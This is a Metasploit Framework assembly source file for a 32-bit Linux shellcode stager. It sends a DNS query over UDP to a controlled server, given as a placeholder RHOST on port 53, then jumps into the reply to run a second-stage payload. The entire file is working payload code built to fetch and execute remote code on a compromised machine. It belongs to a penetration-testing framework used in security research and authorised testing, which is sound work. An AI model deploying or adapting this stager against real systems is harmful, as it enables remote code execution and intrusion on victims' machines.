;;
; 
;        Name: stager_sock_reverse_udp_dns
;   Qualities: Can Have Nulls
;   Platforms: Linux
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This payload stages by querying a controlled DNS server
;        and jumping into the response record that should contain 
;        the second stage.
;        
;
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx
	mul  ebx

socket:
	push ebx
	push byte 0x2
	push byte 0x2
	inc  ebx
	mov  al, 0x66
	mov  ecx, esp
	int  0x80
	xchg eax, ebx
	pop  ebp

; \x04blah\x03com\x00
; 0x18
; 0xbffff900:     0x00040000      0x00001000      0x00000000      0xbffff907
; 0xbffff910:     0x00000000      0x00010001      0x00000002      0x00000000
; 0xbffff920:     0x00000001      0xbffff9e6      0x00000000      0xbffffa37

sendto:
	inc  dl
	push dx
	push dx
	dec  dl
	push dx
	push dword 0x6d6f6303 ; \x03com
	mov  cl, 0x3
	push ecx              ; q.rr[0].host = non-deterministic
	push edx              ; q.nscount = 0, q.arcount = 0
	mov  dh, 0x01
	push edx              ; q.qdcount = 1, q.ancount = 0
	mov  dh, 0x4
	push dx               ; q.flags = 0x4 (AA)
	push si               ; q.id = non-deterministic
	mov  esi, esp
;	push dword 0x03a0f280
	push dword 0x0100007f ; RHOST
	mov  dh, 0x35
	push dx
	push bp
	mov  edi, esp
	push byte 0x10
	push edi
	cdq
	push edx
	push byte 0x19; XXX size
	push esi
	push ebx
	mov  ecx, esp
	push byte 0xb
	pop  ebx
	mov  al, 0x66
	int  0x80

recv:
	pop  ebx
	mov  dh, 0xc
	mov  al, 0x3
	int  0x80
	add  ecx, byte 0xd
	jmp  ecx
